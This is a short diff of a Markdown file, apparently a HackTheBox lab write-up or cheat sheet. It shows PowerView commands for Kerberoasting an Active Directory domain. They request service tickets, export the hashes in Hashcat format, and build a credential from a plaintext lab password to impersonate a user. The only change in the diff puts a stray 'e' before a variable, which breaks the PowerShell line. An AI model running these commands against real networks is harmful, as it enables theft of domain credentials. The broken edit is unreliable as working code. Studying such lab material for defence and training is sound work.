@@ -131,7 +131,7 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 
 ```powershell
 $Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
+e$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
 
 Invoke-UserImpersonation -Credential $Cred
 Invoke-Kerberoast
